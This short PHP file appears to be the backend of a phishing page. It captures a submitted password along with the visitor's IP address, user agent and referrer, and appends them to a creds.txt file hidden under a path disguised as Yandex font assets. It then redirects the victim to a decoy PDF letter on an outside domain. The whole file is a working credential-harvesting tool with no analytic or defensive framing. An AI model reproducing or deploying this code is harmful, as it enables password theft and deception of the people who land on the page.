<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $passwd = trim($_POST['passwd'] ?? '');

    if ($passwd === '') {
        header("Location: /css/fonts/yandex/welcome/auth-34213-12341234-123412-341234123-42134f13ef43-23r4324r-234r324/");
        exit();
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ref = $_SERVER['HTTP_REFERER'] ?? '';

    $log = "----- [" . date('Y-m-d H:i:s') . "] -----\n";
    $log .= "PASS: $passwd\nIP: $ip\nUA: $ua\nREF: $ref\n--------------------------\n";

    $path = __DIR__ . '/css/fonts/yandex/welcome/auth-34213-12341234-123412-341234123-42134f13ef43-23r4324r-234r324/creds.txt';

    file_put_contents($path, $log, FILE_APPEND);

    header("Location: https://stats.domtelecom.net/css/fonts/yandex/welcome/auth-34213-12341234-123412-341234123-42134f13ef43-23r4324r-234r324/%D0%9F%D0%B8%D1%81%D1%8C%D0%BC%D0%BE_%D0%9B%D1%83%D0%B3%D0%B0%D0%BD%D1%81%D0%BA%D0%B2%D0%BE%D0%B4%D0%B0_%D0%BE%D1%82_01.07.25.pdf");
    exit();
}
?>
